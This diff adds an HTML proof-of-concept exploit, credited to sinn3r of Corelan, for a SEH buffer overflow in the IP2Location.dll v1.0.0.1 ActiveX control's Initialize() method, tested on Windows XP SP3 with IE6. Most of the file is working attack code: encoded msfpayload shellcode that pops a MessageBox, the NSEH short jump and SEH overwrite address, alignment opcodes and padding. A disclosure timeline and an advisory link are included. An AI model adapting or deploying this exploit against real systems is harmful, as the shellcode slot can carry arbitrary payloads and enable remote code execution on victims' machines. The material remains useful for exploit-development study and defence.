@@ -1,0 +1,83 @@
+<html>
+<head>
+<title>IP2Location.dll v1.0.0.1 Initialize() Buffer Overflow by sinn3r</title>
+</head>
+<body>
+<object classid='clsid:A3C8BFFA-1496-4188-A2BC-355A0B3DA0A7' id='ip2location'></object>
+<script language="JavaScript">
+/*
+IP2Location.dll v1.0.0.1 Initialize() Buffer Overflow
+Vulnerable version : v1.0.0.1 (checksum: d86933ab58720c384bdc081d33684f7d)
+patched version    : v1.0.0.1 (checksum: bf66e2ef8be3c301b381cfb424ad0afc), v3.0.1.0
+Found and coded by sinn3r
+http://twitter.com/_sinn3r
+Greets: Corelan Security Team & Exploit-DB
+1) Script provided 'as is', without any warranty. Use for educational purposes only.
+2) Do not use this code to do anything illegal, that's ridiculous!
+3) You are not allowed to edit/modify this code. If you do, Corelan Security cannot be
+   held responsible for any damages this may cause.
+
+Timeline:
+05/19/2010	Vendor Contacted.
+05/20/2010	Vendor asking for more details
+05/29/2010	Received the latest beta release from vendor
+05/30/2010	public
+
+For more vulnerability details, visit:
+http://www.corelan.be:8800/advisories.php?id=CORELAN-10-044
+*/
+
+// ./msfpayload windows/messagebox exitfunc=thread TEXT="by sinn3r" TITLE="Demo by Corelan"
+messagebox = "PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIHYJKMK8Y2T7TZTP1XRNRRZVQ9YSTL"+
+             "KT1VPLKSFDLLKSFULLKG6THLK3NQ0LK7FP80OUH2UL3V95Q8QKOM1CPLK2LFD6DLKW5GLLK1DUU48C1JJLKQZUHL"+
+             "K1JWP31ZKKSVWG9LKP4LKEQJNP1KO6Q9PKLNLMTIP2TDJIQXOTMC1HGM9L1KOKOKOGKSLFDQ8RUYNLK0ZVDS1JKU"+
+             "6LKTLPKLK0ZELUQJKLKUTLK5QM8MYPDVDEL3QO3OB5XQ9YDMYZEK9O2RHLNPNDNZL62KXMLKOKOKOK9QUUTOKZO8"+
+             "NKPSPLGULWTPRZHLKKOKOKOLIW5THBH2LRL7PKO58VS6RVNU4CXT5T3CUCBK8QL7TUZMYM6PVKOV55TMYHBF0OKO"+
+             "XY20MOLLG5LFD0RM8QNKOKOKO582LSQ2NPXU8QS2OBRSUE8GPSRSIQ058G42ERMRO6Q9KMXQLWT4OK9JC3X2R68W"+
+             "P10SX592NRNVSE8U2BY7PRSVQIYMX0LQ439K9KQFQYBQB63PQPRKON06QIPPPKOF5UXEZA";
+
+alignment = unescape(
+"%58"+		//POP EAX
+"%04%0B"	//ADD AL, 0x0B
+);
+
+// Tested size  = 10260 bytes
+var padding1	= unescape("%41");			//Padding
+while (padding1.length < 1912)
+	padding1 += unescape("%41");
+
+var nseh	= unescape("%EB%06%42%42");		//Short Jump
+var seh		= unescape("%71%33%6E%74");		//0x746E3371  msls31.dll  IE6
+
+var padding2	= unescape("%41");			//Padding
+while (padding2.length < 10000)
+	padding2 += unescape("%41");
+
+buffer = padding1 + nseh + seh + alignment + messagebox + padding2;
+
+var arg1 = ip2location.Initialize(buffer);
+</script>
+<pre>
+|------------------------------------------------------------------|
+|                         __               __                      |
+|   _________  ________  / /___ _____     / /____  ____ _____ ___  |
+|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
+| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
+| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
+|                                                                  |
+|                                       http://www.corelan.be:8800 |
+|                                                                  |
+|-------------------------------------------------[ EIP Hunters ]--|
+
+[+] IP2Location.dll v1.0.0.1 Initialize() Buffer Overflow
+[+] http://www.corelan.be:8800/advisories.php?id=CORELAN-10-044
+[+] Tested on Windows XP SP3 + IE 6.0 + IP2Location.dll v1.0.0.1
+[+] Found and coded by sinn3r  -  x90.sinner{at}gmail{d0t}c0m
+[+] http://twitter.com/_sinn3r
+[+] Special thanks to: corelanc0d3r and Sud0
+
+Download the DLL, do a "regsvr32 IP2Location.dll", and run the proof of concept.
+When successful, this POC should pop up a MessageBox.
+</pre>
+</body>
+</html>
